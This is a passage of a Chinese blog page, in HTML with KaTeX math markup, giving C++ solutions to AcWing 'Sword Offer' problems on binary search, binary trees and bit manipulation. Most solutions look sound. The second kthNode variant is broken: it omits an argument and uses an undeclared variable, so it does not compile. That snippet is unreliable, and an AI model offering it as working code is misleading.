<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个数字中有且只有一个数字不在该数组中，请找出这个数字。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入：[0,1,2,4]输出：3</code></pre><h3 id="二分法">二分法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getMissingNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n_minus_1 = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">back</span>() == n_minus_1 - <span class="number">1</span>) <span class="keyword">return</span> n_minus_1;  <span class="comment">// 确保能二分</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] != mid) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组中数值和下标相等的元素"><a href="https://www.acwing.com/problem/content/65/">数组中数值和下标相等的元素</a></h2><p>假设一个单调递增的数组里的每个元素都是整数并且是唯一的。</p><p>请编程实现一个函数找出数组中任意一个数值等于其下标的元素。</p><p>例如，在数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><mn>3</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-3, -1, 1, 3, 5]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">]</span></span></span></span> 中，数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 和它的下标相等。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[-3, -1, 1, 3, 5]输出：3</code></pre><p><strong>注意</strong>:如果不存在，则返回-1。</p><h3 id="二分法-2">二分法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getNumberSameAsIndex</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &gt;= mid) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[l] == l) <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二叉搜索树的第k个结点★"><a href="https://www.acwing.com/problem/content/66/">二叉搜索树的第k个结点★</a></h2><p>给定一棵二叉搜索树，请找出其中的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 小的结点。</p><p>你可以假设树和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 都存在，并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>k</mi><mo>≤</mo></mrow><annotation encoding="application/x-tex">1≤k≤</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span></span></span></span> 树的总结点数。</p><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：root = [2, 1, 3, null, null, null, null] ，k = 3    2   / \  1   3输出：3</code></pre><h3 id="dfs">dfs</h3><p>对二叉树进行中序遍历，统计序列中第k位是啥。</p><blockquote><p>扩展：如果是求 <strong>第k大的</strong>，只需要按照 <strong>右 - 自 - 左</strong> 顺序去找即可。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">int</span> k_;</span><br><span class="line">  TreeNode *res_;</span><br><span class="line">  </span><br><span class="line">  <span class="function">TreeNode* <span class="title">kthNode</span><span class="params">(TreeNode* root, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    k_ = k;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span> (!(--k_)) res_ = root;</span><br><span class="line">    <span class="keyword">if</span> (k_ &gt; <span class="number">0</span>) <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>不使用类的成员变量（效果与 <code>全局变量</code> 基本等价）的写法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">kthNode</span><span class="params">(TreeNode* root, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    TreeNode *res;</span><br><span class="line">    <span class="built_in">dfs</span>(root, k, &amp;res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root, <span class="type">int</span> &amp;k, TreeNode **res)</span> </span>&#123;  <span class="comment">// &amp; 和 **</span></span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left, k);</span><br><span class="line">    <span class="keyword">if</span> (!(--i)) *res = root;</span><br><span class="line">    <span class="keyword">if</span> (k &gt; <span class="number">0</span>) <span class="built_in">dfs</span>(root-&gt;right, k);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二叉树的深度"><a href="https://www.acwing.com/problem/content/67/">二叉树的深度</a></h2><p>输入一棵二叉树的根结点，求该树的深度。</p><p>从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。</p><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：二叉树[8, 12, 2, null, null, 6, 4, null, null, null, null]如下图所示：    8   / \  12  2     / \    6   4输出：3</code></pre><h3 id="递归大法好">递归大法好</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">treeDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">treeDepth</span>(root-&gt;left), <span class="built_in">treeDepth</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="平衡二叉树★"><a href="https://www.acwing.com/problem/content/68/">平衡二叉树★</a></h2><p>输入一棵二叉树的根结点，判断该树是不是平衡二叉树。</p><p>如果某二叉树中任意结点的左右子树的深度相差不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，那么它就是一棵平衡二叉树。</p><p><strong>注意：</strong></p><ul><li>规定空树也是一棵平衡二叉树。</li></ul><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：二叉树[5,7,11,null,null,12,9,null,null,null,null]如下所示，    5   / \  7  11    /  \   12   9输出：true</code></pre><h3 id="后序遍历，未剪枝">后序遍历，未剪枝</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">bool</span> res_ = <span class="literal">true</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l = <span class="built_in">dfs</span>(root-&gt;left), r = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>(l - r) &gt; <span class="number">1</span>) res_ = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(l, r) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="后序-剪枝">后序 + 剪枝</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(root) != <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> depth_l = <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span> (depth_l == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> depth_r = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">if</span> (depth_r == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">abs</span>(depth_l - depth_r) &lt;= <span class="number">1</span>)? <span class="built_in">max</span>(depth_l, depth_r) + <span class="number">1</span>: <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组中只出现一次的两个数字★"><a href="https://www.acwing.com/problem/content/69/">数组中只出现一次的两个数字★</a></h2><p>一个整型数组里除了两个数字之外，其他的数字都出现了两次。</p><p>请写程序找出这两个只出现一次的数字。</p><p>你可以假设这两个数字一定存在。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,2,3,3,4,4]输出：[1,2]</code></pre><h3 id="题解-11">题解</h3><blockquote><p>4种位运算: &amp;与 |或 ^异或 ~非</p></blockquote><p>思路:</p><ul><li>先将所有元素异或起来, 异或结果sum就为这2个只出现1次元素的异或</li><li>然后找到sum中某一位为1, 然后根据第k位是否为1将数组分成两部分<br>由于这2个只出现1次的元素会被分开, 而出现两次的元素必定会被分到同一部分中<br>因此这两部分都满足: 只有1个元素出现1次, 其他元素都出现2次</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findNumsAppearOnce</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) sum ^= x;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!(sum &gt;&gt; k &amp; <span class="number">1</span>)) k++;</span><br><span class="line">    <span class="type">int</span> first = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &gt;&gt; k &amp; <span class="number">1</span>) first ^= x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;first, sum ^= first&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组中唯一只出现一次的数字★"><a href="https://www.acwing.com/problem/content/70/">数组中唯一只出现一次的数字★</a></h2><p>在一个数组中除了一个数字只出现一次之外，其他数字都出现了三次。</p><p>请找出那个只出现一次的数字。</p><p>你可以假设满足条件的数字一定存在。</p><p><strong>思考题：</strong></p><ul><li>如果要求只使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的时间和额外 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 的空间，该怎么做呢？</li></ul><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,1,1,2,2,2,3,4,4,4]输出：3</code></pre><h3 id="法1-按位统计">法1 按位统计</h3><p>一共32个位，统计哪个位 1 出现次数 % 3 == 1，那么所求数该位为1，最后合起来就是答案。</p><p>时间复杂度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>32</mn><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(32n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">32</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>因为 n 一般在百万级别，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo>&lt;</mo><mn>32</mn></mrow><annotation encoding="application/x-tex">logn&lt;32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mspace" 